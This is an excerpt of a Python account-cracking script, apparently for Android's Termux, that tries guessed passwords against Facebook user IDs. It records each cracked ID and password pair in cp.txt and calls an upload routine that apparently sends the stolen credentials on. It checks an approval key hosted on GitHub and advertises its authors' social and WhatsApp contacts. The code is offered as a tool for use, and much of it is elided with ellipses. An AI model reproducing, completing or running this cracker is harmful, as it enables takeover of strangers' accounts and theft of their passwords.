...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/arafat-mahin310/approve-3.txt"])
	exit(" [*] FACEBOOK :  ALINUR RAHMAN")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Arafat Bin 𝓜𝓪𝓱𝓲𝓷")
	subprocess.check_output(["am", "start", "https://wa.me/+8801925798757"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/4deeL-khan/Jaan/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;92m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [M9_OLD] : %s/%s -> \033[0;92m [ MAHIN-OK:%s ]- \033[0;91m[M9-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[M9-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [M9-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
